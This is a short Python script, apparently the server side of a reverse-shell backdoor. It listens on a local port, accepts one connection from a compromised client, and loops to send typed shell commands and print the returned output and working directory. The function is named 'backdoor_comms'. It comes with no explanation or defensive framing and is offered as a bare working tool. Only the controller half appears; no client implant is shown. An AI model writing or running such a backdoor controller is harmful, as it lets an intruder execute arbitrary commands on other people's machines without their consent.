#SERVER
import socket 


HOST = "127.0.0.1" 
PORT = 9999
BUFFER = 2024 
SEP = "<sep>"

def backdoor_comms(): 
    cwd = conn.recv(BUFFER).decode()
    while True: 
        command = input(f"[SHELL] {cwd}$> ")
        command = command.strip(" ")  
        conn.send(command.encode())  

        output = conn.recv(BUFFER).decode() 
        results, cwd = output.split(SEP) 
        print(results)


def main(): 
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 

    server_sock.bind((HOST, PORT))
    server_sock.listen(1)  
    global conn
    conn, addr = server_sock.accept() 
    backdoor_comms()

main() 